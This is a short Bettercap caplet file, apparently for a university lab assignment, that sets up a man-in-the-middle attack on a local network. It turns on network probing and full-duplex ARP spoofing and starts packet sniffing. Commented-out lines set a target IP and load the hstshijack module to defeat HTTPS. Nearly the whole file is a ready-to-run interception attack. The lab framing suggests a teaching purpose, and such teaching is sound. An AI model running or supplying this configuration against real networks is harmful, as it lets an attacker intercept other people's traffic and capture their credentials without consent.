# Bettercap interactive session commands for Assignment 2
# Usage: sudo bettercap -iface eth0 -caplet mitm_session.cap
# Or execute line by line inside bettercap prompt

# 1. Probing & discovery
net.probe on
net.recon on

# 2. Configure full-duplex ARP spoofing
set arp.spoof.fullduplex true

# 3. Discover available devices
net.show

# 4. Target IP configuration (Replace with your actual target IP in lab)
# Example: set arp.spoof.targets 10.126.134.214
# arp.spoof on

# 5. Caplet inspection & HSTS Hijacking
# caplets.show
# include hstshijack/hstshijack

# 6. Sniffing traffic locally and on wire
set net.sniff.local true
net.sniff on

